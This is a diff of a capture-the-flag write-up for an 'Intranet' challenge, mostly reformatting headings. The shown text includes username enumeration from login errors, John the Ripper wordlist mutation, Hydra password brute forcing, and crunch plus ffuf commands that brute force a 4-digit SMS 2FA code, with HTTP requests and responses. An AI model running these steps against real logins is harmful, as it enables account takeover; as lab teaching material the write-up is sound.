@@ -162,12 +162,12 @@ Finished
 <h2>Login</h2>
 <p>
   
-- 200 OK, Invalid password for <code>username=anders%40securesolacoders.no&password=password</code><br>
-- 200 OK, Invalid password for <code>username=devops%40securesolacoders.no&password=password</code><br>
-- 200 OK, Invalid username for <code>username=magnus%40securesolacoders.no&password=password</code><br>
-- 200 OK, Invalid password for <code>username=admin%40securesolacoders.no&password=password</code></p>
+- 200 OK, Invalid password for username= <code>anders</code>%40securesolacoders.no&password=password<br>
+- 200 OK, Invalid password for username= <code>devops</code>%40securesolacoders.no&password=password<br>
+- 200 OK, Invalid username for username= <code>magnus</code>%40securesolacoders.no&password=password<br>
+- 200 OK, Invalid password for username= <code>admin</code>%40securesolacoders.no&password=password</p>
 
-<h2><code>reference</code></h2>
+<h2>Keywords</h2>
 
 ```bash
 (rosana) :~/Intranet# cat reference
@@ -180,13 +180,13 @@ developer
 senior
 ```
 
-<h2>John the Ripper to create <code>words</code></h2>
+<h2>John the Ripper to create a wordlist</h2>
 
 ```bash
 (rosana) :~/Intranet# john -wordlist:reference -rules:jumbo -stdout > words
 ```
 
-<h2><code>users</code></h2>
+<h2>Users</h2>
 
 ```bash
 (rosana) :~/Intranet# cat users
@@ -195,7 +195,7 @@ devops@40securesolacoders.no
 admin@securesolacoders.no
 ```
 
-<h2>hydra</h2>
+<h2>Hydra</h2>
 
 <p>
 
@@ -217,7 +217,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-08-28 xx:xx:
 
 <br>
 <br>
-<h6><em>Request</em></h6>
+<h6>Request</h6>
 
 ```bash
 POST /login HTTP/1.1
@@ -237,7 +237,7 @@ Priority: u=0, i
 username=anders%40securesolacoders.no&password=********************
 ```
 
-<h6><em>Response</em></h6>
+<h6>Response</h6>
 
 ```bash
 HTTP/1.1 302 FOUND
@@ -263,7 +263,7 @@ Connection: close
 - web application flag<br>
 - <code>2FA</code> code has been sent to <code>+47 *****299</code></p>
 
-<h6><em>Request</em></h6>
+<h6>Request</h6>
 
 ```bash
 GET /sms HTTP/1.1
@@ -279,7 +279,7 @@ Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 ```
 
-<h6><em>Response</em></h6>
+<h6>Response</h6>
 
 ```bash
 HTTP/1.1 200 OK
@@ -315,7 +315,7 @@ Connection: close
 
 <br>
 
-<h2>crunch . 0000 to 9999</h2>
+<h2>Crunch to create a wordlist . 0000 to 9999</h2>
 
 ```bash
 (rosana) :~/Intranet# crunch 4 4 -t %%%% -o support
@@ -339,7 +339,7 @@ crunch: 100% completed generating output
 9999
 ```
 
-<h2>ffuf</h2>
+<h2>Ffuf</h2>
 
 ```bash
 (rosana) :~/Intranet# ffuf -u http://xx.xxx.x.xxx:8080/sms -c -w support -X POST -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -b 'session=***************************.******.***************************' -fc 200
@@ -388,7 +388,6 @@ crunch: 100% completed generating output
 
 <br>
 <h2>Update</h2>
-
 <p>
 
 - news=latest</p>
@@ -419,7 +418,6 @@ crunch: 100% completed generating output
 
 <br>
 <br>
-
 <p>
 
 - key = secret_key_ + ######<br>
